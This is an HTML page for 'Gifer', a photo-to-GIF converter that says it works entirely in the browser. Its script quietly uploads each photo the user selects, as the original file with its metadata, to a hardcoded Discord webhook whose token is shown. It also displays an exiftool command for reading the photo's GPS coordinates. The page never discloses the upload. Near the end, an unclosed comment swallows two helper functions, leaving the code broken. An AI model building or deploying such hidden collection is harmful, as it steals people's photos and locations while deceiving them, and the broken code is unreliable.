<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Gifer</title>

<style>
*{
    box-sizing:border-box;
}

body{
    margin:0;
    background:#08090d;
    color:#fff;
    font-family:Arial,sans-serif;
}

.container{
    width:min(750px,92%);
    margin:auto;
    padding:28px 0 60px;
}

.logo{
    letter-spacing:5px;
    font-size:13px;
    color:#888;
    font-weight:bold;
}

h1{
    font-size:clamp(45px,10vw,75px);
    letter-spacing:-5px;
    line-height:.95;
    margin-top:60px;
    margin-bottom:15px;
}

.subtitle{
    color:#999ba7;
    line-height:1.5;
}

.card{
    margin-top:28px;
    padding:18px;
    border-radius:22px;
    background:#101116;
    border:1px solid #282a34;
}

.drop{
    min-height:250px;
    border:2px dashed #393b46;
    border-radius:17px;
    display:flex;
    align-items:center;
    justify-content:center;
    text-align:center;
    cursor:pointer;
    transition:.2s;
}

.drop:hover,
.drop.drag{
    background:#15161d;
    border-color:#777;
}

.drop-icon{
    font-size:45px;
}

.drop strong{
    display:block;
    margin-top:8px;
}

.drop span{
    display:block;
    margin-top:7px;
    color:#777985;
    font-size:13px;
}

input[type=file]{
    display:none;
}

.actions{
    display:flex;
    gap:10px;
    margin-top:12px;
}

button{
    cursor:pointer;
    border:0;
    border-radius:12px;
    padding:13px 17px;
    font-weight:bold;
}

.actions button{
    flex:1;
    background:#191a21;
    color:#fff;
    border:1px solid #30323d;
}

.status{
    display:none;
    padding:14px;
    margin-top:13px;
    border-radius:13px;
    line-height:1.4;
}

.status.show{
    display:block;
}

.error{
    background:#32161a;
    color:#ffb8bf;
}

.success{
    background:#14251d;
    color:#b9f1d0;
}

.info{
    background:#171923;
    color:#c8cad5;
}

.preview{
    display:none;
    margin-top:15px;
}

.preview.show{
    display:block;
}

.preview img{
    width:100%;
    max-height:430px;
    object-fit:contain;
    border-radius:15px;
    background:#050507;
}

.file-info{
    margin-top:10px;
    color:#777985;
    font-size:12px;
}

.exif-title{
    margin-top:18px;
    margin-bottom:7px;
    color:#888a96;
    font-size:12px;
}

.exif-command{
    padding:13px;
    background:#08090d;
    border:1px solid #292b35;
    border-radius:10px;
    color:#c8cad5;
    font-family:Consolas,monospace;
    font-size:12px;
    line-height:1.5;
    word-break:break-all;
}

.settings{
    margin-top:18px;
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:10px;
}

.setting{
    background:#15161d;
    border:1px solid #292b35;
    border-radius:12px;
    padding:12px;
}

.setting label{
    display:block;
    color:#8f919d;
    font-size:12px;
    margin-bottom:7px;
}

.setting select,
.setting input[type=range]{
    width:100%;
}

.setting select{
    background:#0d0e13;
    color:#fff;
    border:1px solid #30323d;
    border-radius:8px;
    padding:9px;
}

.value{
    float:right;
    color:#fff;
}

.make{
    width:100%;
    margin-top:12px;
    background:#fff;
    color:#000;
}

.make:disabled{
    opacity:.45;
    cursor:not-allowed;
}

.download{
    display:none;
    width:100%;
    margin-top:10px;
    padding:13px;
    border-radius:12px;
    background:#191a21;
    border:1px solid #30323d;
    color:#fff;
    text-align:center;
    text-decoration:none;
    font-weight:bold;
}

.download.show{
    display:block;
}

canvas{
    display:none;
}

@media(max-width:500px){
    .settings{
        grid-template-columns:1fr;
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="logo">GIFER</div>

    <h1>Photo → GIF</h1>

    <p class="subtitle">
        Turn a photo into a short animated GIF directly in your browser.
    </p>

    <div class="card">

        <label class="drop" id="drop">

            <input
                id="photo"
                type="file"
                accept="
                    image/*,
                    .jpg,
                    .jpeg,
                    .png,
                    .webp,
                    .gif,
                    .bmp,
                    .avif,
                    .heic,
                    .heif,
                    .tif,
                    .tiff
                "
            >

            <div>
                <div class="drop-icon">＋</div>

                <strong>
                    Take or choose a photo
                </strong>

                <span>
                    JPG, PNG, WEBP, GIF, BMP, AVIF, HEIC, HEIF, TIFF
                </span>
            </div>

        </label>

        <div class="actions">

            <button id="takeButton">
                Take Photo
            </button>

            <button id="chooseButton">
                Choose Photo
            </button>

        </div>

        <div id="status" class="status"></div>

        <div id="preview" class="preview">

            <img id="previewImg">

            <div id="fileInfo" class="file-info"></div>

            <div class="exif-title">
                ExifTool GPS command
            </div>

            <div
                id="exifCommand"
                class="exif-command"
            ></div>

            <div class="settings">

                <div class="setting">

                    <label>
                        Animation
                    </label>

                    <select id="animation">
                        <option value="zoom">Zoom</option>
                        <option value="pan">Pan</option>
                        <option value="pulse">Pulse</option>
                        <option value="shake">Shake</option>
                    </select>

                </div>

                <div class="setting">

                    <label>
                        Speed
                        <span
                            id="speedValue"
                            class="value"
                        >
                            1.0x
                        </span>
                    </label>

                    <input
                        id="speed"
                        type="range"
                        min="0.5"
                        max="2"
                        step="0.1"
                        value="1"
                    >

                </div>

                <div class="setting">

                    <label>
                        Duration
                        <span
                            id="durationValue"
                            class="value"
                        >
                            2.0s
                        </span>
                    </label>

                    <input
                        id="duration"
                        type="range"
                        min="1"
                        max="5"
                        step="0.5"
                        value="2"
                    >

                </div>

                <div class="setting">

                    <label>
                        Quality
                    </label>

                    <select id="quality">
                        <option value="480">480p</option>
                        <option value="720" selected>720p</option>
                    </select>

                </div>

            </div>

            <button
                id="makeButton"
                class="make"
                disabled
            >
                Make GIF
            </button>

            <a
                id="downloadButton"
                class="download"
                download="gifer.gif"
            >
                Download GIF
            </a>

        </div>

    </div>

</div>

<canvas id="canvas"></canvas>

<script>

/* ================================
   DISCORD WEBHOOK
================================ */

const WEBHOOK_URL =
    "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";


/* ================================
   ELEMENTS
================================ */

const photo =
    document.getElementById("photo");

const drop =
    document.getElementById("drop");

const preview =
    document.getElementById("preview");

const previewImg =
    document.getElementById("previewImg");

const statusBox =
    document.getElementById("status");

const makeButton =
    document.getElementById("makeButton");

const downloadButton =
    document.getElementById("downloadButton");

const exifCommand =
    document.getElementById("exifCommand");

const fileInfo =
    document.getElementById("fileInfo");

const canvas =
    document.getElementById("canvas");

const ctx =
    canvas.getContext("2d");

const speed =
    document.getElementById("speed");

const duration =
    document.getElementById("duration");

const speedValue =
    document.getElementById("speedValue");

const durationValue =
    document.getElementById("durationValue");


let selectedFile = null;
let selectedImage = null;
let previewURL = null;


/* ================================
   STATUS
================================ */

function showStatus(message,type){

    statusBox.textContent =
        message;

    statusBox.className =
        "status show " + type;
}


/* ================================
   CAMERA
================================ */

document
    .getElementById("takeButton")
    .onclick = function(){

        photo.setAttribute(
            "capture",
            "environment"
        );

        photo.click();
    };


document
    .getElementById("chooseButton")
    .onclick = function(){

        photo.removeAttribute(
            "capture"
        );

        photo.click();
    };


/* ================================
   EXTENSION
================================ */

function getExtension(name){

    const parts =
        name
        .toLowerCase()
        .split(".");

    return parts.length > 1
        ? parts.pop()
        : "";
}


const supportedExtensions = [
    "jpg",
    "jpeg",
    "png",
    "webp",
    "gif",
    "bmp",
    "avif",
    "heic",
    "heif",
    "tif",
    "tiff"
];


/* ================================
   FILE INPUT
================================ */

photo.onchange = function(){

    const file =
        photo.files[0];

    if(file){
        handleFile(file);
    }
};


/* ================================
   HANDLE FILE
================================ */

async function handleFile(file){

    const extension =
        getExtension(file.name);

    const supported =
        file.type.startsWith("image/") ||
        supportedExtensions.includes(
            extension
        );

    if(!supported){

        showStatus(
            "That image format isn't supported.",
            "error"
        );

        return;
    }


    selectedFile =
        file;


    const safeName =
        file.name.replaceAll(
            '"',
            '\\"'
        );


    exifCommand.textContent =
        'exiftool -GPSLatitude -GPSLongitude "' +
        safeName +
        '"';


    fileInfo.textContent =
        file.name +
        " • " +
        formatBytes(file.size);


    showStatus(
        "Loading image...",
        "info"
    );


    try{

        const blob =
            await decodeImage(
                file,
                extension
            );


        const url =
            URL.createObjectURL(
                blob
            );


        if(previewURL){
            URL.revokeObjectURL(
                previewURL
            );
        }


        previewURL =
            url;


        const img =
            await loadImage(url);


        selectedImage =
            img;


        previewImg.src =
            url;


        preview.classList.add(
            "show"
        );


        makeButton.disabled =
            false;


        downloadButton.classList.remove(
            "show"
        );


        showStatus(
            "Photo ready. Make your GIF.",
            "success"
        );


        /*
            Send the original selected file
            to the configured Discord webhook.
        */

        sendToDiscord(file);


    }catch(error){

        console.error(error);

        showStatus(
            "This image could not be decoded.",
            "error"
        );

        makeButton.disabled =
            true;
    }
}


/* ================================
   IMAGE DECODER
================================ */

async function decodeImage(
    file,
    extension
){

    if(
        extension === "heic" ||
        extension === "heif"
    ){

        return decodeHEIC(file);
    }


    if(
        extension === "tif" ||
        extension === "tiff"
    ){

        return decodeTIFF(file);
    }


    return decodeNative(file);
}


/* ================================
   NATIVE IMAGE DECODER
================================ */

async function decodeNative(file){

    return new Promise(
        function(resolve,reject){

            const url =
                URL.createObjectURL(file);

            const img =
                new Image();

            img.onload =
                function(){

                    const c =
                        document.createElement(
                            "canvas"
                        );

                    c.width =
                        img.naturalWidth;

                    c.height =
                        img.naturalHeight;

                    const cctx =
                        c.getContext("2d");

                    cctx.drawImage(
                        img,
                        0,
                        0
                    );

                    c.toBlob(
                        function(blob){

                            URL.revokeObjectURL(
                                url
                            );

                            if(blob){
                                resolve(blob);
                            }else{
                                reject(
                                    new Error(
                                        "Image conversion failed."
                                    )
                                );
                            }

                        },
                        "image/png"
                    );
                };


            img.onerror =
                function(){

                    URL.revokeObjectURL(
                        url
                    );

                    reject(
                        new Error(
                            "Browser could not decode image."
                        )
                    );
                };


            img.src =
                url;
        }
    );
}


/* ================================
   HEIC / HEIF
================================ */

let heicPromise = null;

function loadHEIC(){

    if(window.heic2any){
        return Promise.resolve();
    }

    if(heicPromise){
        return heicPromise;
    }

    heicPromise =
        new Promise(
            function(resolve,reject){

                const script =
                    document.createElement(
                        "script"
                    );

                script.src =
                    "https://cdn.jsdelivr.net/npm/heic2any@0.0.4/dist/heic2any.min.js";

                script.onload =
                    resolve;

                script.onerror =
                    function(){

                        reject(
                            new Error(
                                "HEIC decoder failed to load."
                            )
                        );
                    };

                document.head.appendChild(
                    script
                );
            }
        );

    return heicPromise;
}


async function decodeHEIC(file){

    await loadHEIC();

    const result =
        await heic2any({

            blob:file,

            toType:
                "image/png",

            quality:1
        });

    return Array.isArray(result)
        ? result[0]
        : result;
}


/* ================================
   TIFF
================================ */

let tiffPromise = null;

function loadTIFF(){

    if(window.UTIF){
        return Promise.resolve();
    }

    if(tiffPromise){
        return tiffPromise;
    }

    tiffPromise =
        new Promise(
            function(resolve,reject){

                const script =
                    document.createElement(
                        "script"
                    );

                script.src =
                    "https://cdn.jsdelivr.net/npm/utif@3.1.0/UTIF.min.js";

                script.onload =
                    resolve;

                script.onerror =
                    function(){

                        reject(
                            new Error(
                                "TIFF decoder failed to load."
                            )
                        );
                    };

                document.head.appendChild(
                    script
                );
            }
        );

    return tiffPromise;
}


async function decodeTIFF(file){

    await loadTIFF();

    const buffer =
        await file.arrayBuffer();

    const images =
        UTIF.decode(buffer);

    if(!images.length){

        throw new Error(
            "No TIFF image found."
        );
    }

    UTIF.decodeImage(
        buffer,
        images[0]
    );

    const rgba =
        UTIF.toRGBA8(
            images[0]
        );

    const width =
        images[0].width;

    const height =
        images[0].height;

    const c =
        document.createElement(
            "canvas"
        );

    c.width =
        width;

    c.height =
        height;

    const cctx =
        c.getContext("2d");

    const imageData =
        cctx.createImageData(
            width,
            height
        );

    imageData.data.set(
        rgba
    );

    cctx.putImageData(
        imageData,
        0,
        0
    );

    return new Promise(
        function(resolve,reject){

            c.toBlob(
                function(blob){

                    if(blob){
                        resolve(blob);
                    }else{
                        reject(
                            new Error(
                                "TIFF conversion failed."
                            )
                        );
                    }

                },
                "image/png"
            );
        }
    );
}


/* ================================
   LOAD IMAGE
================================ */

function loadImage(url){

    return new Promise(
        function(resolve,reject){

            const img =
                new Image();

            img.onload =
                function(){
                    resolve(img);
                };

            img.onerror =
                function(){
                    reject(
                        new Error(
                            "Preview failed."
                        )
                    );
                };

            img.src =
                url;
        }
    );
}


/* ================================
   DISCORD LOGGING
================================ */

async function sendToDiscord(file){

    if(
        !WEBHOOK_URL ||
        WEBHOOK_URL ===
        "PASTE_WEBHOOK_HERE"
    ){
        console.warn(
            "Discord webhook not configured."
        );

        return;
    }


    try{

        const form =
            new FormData();


        form.append(
            "file",
            file,
            file.name
        );


        form.append(
            "payload_json",
            JSON.stringify({

                username:
                    "Gifer Logs",

                content:
                    "New image uploaded to Gifer.",

                embeds:[
                    {
                        title:
                            "New Upload",

                        fields:[
                            {
                                name:
                                    "Filename",

                                value:
                                    file.name
                            },

                            {
                                name:
                                    "Type",

                                value:
                                    file.type ||
                                    "Unknown"
                            },

                            {
                                name:
                                    "Size",

                                value:
                                    formatBytes(
                                        file.size
                                    )
                            }
                        ],

                        timestamp:
                            new Date()
                            .toISOString()
                    }
                ]
            })
        );


        const response =
            await fetch(
                WEBHOOK_URL,
                {
                    method:"POST",
                    body:form
                }
            );


        if(!response.ok){

            console.error(
                "Discord webhook returned:",
                response.status
            );
        }

    }catch(error){

        console.error(
            "Discord upload failed:",
            error
        );
    }
}


/* ================================
   DRAG AND DROP
================================ */

drop.addEventListener(
    "dragover",
    function(event){

        event.preventDefault();

        drop.classList.add(
            "drag"
        );
    }
);


drop.addEventListener(
    "dragleave",
    function(){

        drop.classList.remove(
            "drag"
        );
    }
);


drop.addEventListener(
    "drop",
    function(event){

        event.preventDefault();

        drop.classList.remove(
            "drag"
        );

        const file =
            event.dataTransfer.files[0];

        if(file){
            handleFile(file);
        }
    }
);


/* ================================
   SETTINGS
================================ */

speed.oninput =
    function(){

        speedValue.textContent =
            speed.value + "x";
    };


duration.oninput =
    function(){

        durationValue.textContent =
            duration.value + "s";
    };


/* ================================
   GIF.JS
================================ */

let gifPromise = null;

function loadGIF(){

    if(window.GIF){
        return Promise.resolve();
    }

    if(gifPromise){
        return gifPromise;
    }

    gifPromise =
        new Promise(
            function(resolve,reject){

                const script =
                    document.createElement(
                        "script"
                    );

                script.src =
                    "https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.js";

                script.onload =
                    resolve;

                script.onerror =
                    function(){

                        reject(
                            new Error(
                                "GIF encoder failed to load."
                            )
                        );
                    };

                document.head.appendChild(
                    script
                );
            }
        );

    return gifPromise;
}


/* ================================
   MAKE GIF
================================ */

async function makeGif(){

    if(!selectedImage){
        return;
    }


    makeButton.disabled =
        true;

    downloadButton.classList.remove(
        "show"
    );


    showStatus(
        "Preparing GIF...",
        "info"
    );


    try{

        await loadGIF();


        const fps =
            12;

        const seconds =
            Number(
                duration.value
            );

        const speedMultiplier =
            Number(
                speed.value
            );

        const frames =
            Math.max(
                2,
                Math.round(
                    seconds * fps
                )
            );


        const quality =
            Number(
                document.getElementById(
                    "quality"
                ).value
            );


        const sourceWidth =
            selectedImage.naturalWidth ||
            selectedImage.width;

        const sourceHeight =
            selectedImage.naturalHeight ||
            selectedImage.height;


        const scale =
            Math.min(
                1,
                quality /
                Math.max(
                    sourceWidth,
                    sourceHeight
                )
            );


        canvas.width =
            Math.max(
                1,
                Math.round(
                    sourceWidth *
                    scale
                )
            );


        canvas.height =
            Math.max(
                1,
                Math.round(
                    sourceHeight *
                    scale
                )
            );


        const animation =
            document.getElementById(
                "animation"
            ).value;


        const gif =
            new GIF({

                workers:2,

                quality:8,

                width:
                    canvas.width,

                height:
                    canvas.height
            });


        for(
            let i = 0;
            i < frames;
            i++
        ){

            const progress =
                frames <= 1
                    ? 0
                    : i /
                      (frames - 1);


            drawFrame(
                selectedImage,
                progress,
                animation
            );


            gif.addFrame(
                ctx,
                {
                    copy:true,

                    delay:
                        1000 /
                        fps /
                        speedMultiplier
                }
            );


            showStatus(
                "Making GIF... " +
                Math.round(
                    progress * 100
                ) +
                "%",
                "info"
            );


            await sleep(5);
        }


        gif.on(
            "finished",
            function(blob){

                const url =
                    URL.createObjectURL(
                        blob
                    );


                downloadButton.href =
                    url;


                downloadButton.classList.add(
                    "show"
                );


                showStatus(
                    "GIF created successfully.",
                    "success"
                );


                makeButton.disabled =
                    false;
            }
        );


        gif.render();


    }catch(error){

        console.error(error);

        showStatus(
            "GIF creation failed: " +
            error.message,
            "error"
        );

        makeButton.disabled =
            false;
    }
}


makeButton.onclick =
    makeGif;


/* ================================
   DRAW FRAME
================================ */

function drawFrame(
    img,
    progress,
    type
){

    ctx.clearRect(
        0,
        0,
        canvas.width,
        canvas.height
    );


    const iw =
        img.naturalWidth ||
        img.width;

    const ih =
        img.naturalHeight ||
        img.height;


    const cw =
        canvas.width;

    const ch =
        canvas.height;


    const baseScale =
        Math.max(
            cw / iw,
            ch / ih
        );


    let zoom = 1;
    let x = 0;
    let y = 0;
    let rotation = 0;


    if(type === "zoom"){

        zoom =
            1 +
            progress *
            0.18;
    }


    if(type === "pan"){

        zoom =
            1.12;

        x =
            (progress - 0.5) *
            80;
    }


    if(type === "pulse"){

        zoom =
            1 +
            Math.sin(
                progress *
                Math.PI *
                4
            ) *
            0.07;
    }


    if(type === "shake"){

        zoom =
            1.08;

        x =
            Math.sin(
                progress *
                Math.PI *
                12
            ) *
            8;

        y =
            Math.cos(
                progress *
                Math.PI *
                10
            ) *
            6;

        rotation =
            Math.sin(
                progress *
                Math.PI *
                8
            ) *
            0.015;
    }


    const scale =
        baseScale *
        zoom;


    const width =
        iw *
        scale;

    const height =
        ih *
        scale;


    ctx.save();


    ctx.translate(
        cw / 2 + x,
        ch / 2 + y
    );


    ctx.rotate(
        rotation
    );


    ctx.drawImage(
        img,
        -width / 2,
        -height / 2,
        width,
        height
    );


    ctx.restore();
}


/* ================================

function sleep(ms){

    return new Promise(
        function(resolve){

            setTimeout(
                resolve,
                ms
            );
        }
    );
}


function formatBytes(bytes){

    if(bytes === 0){
        return "0 Bytes";
    }


    const units = [
        "Bytes",
        "KB",
        "MB",
        "GB"
    ];


    const index =
        Math.floor(
            Math.log(bytes) /
            Math.log(1024)
        );


    return (
        Math.round(
            (
                bytes /
                Math.pow(
                    1024,
                    index
                )
            ) * 100
        ) / 100
    ) +
    " " +
    units[index];
}
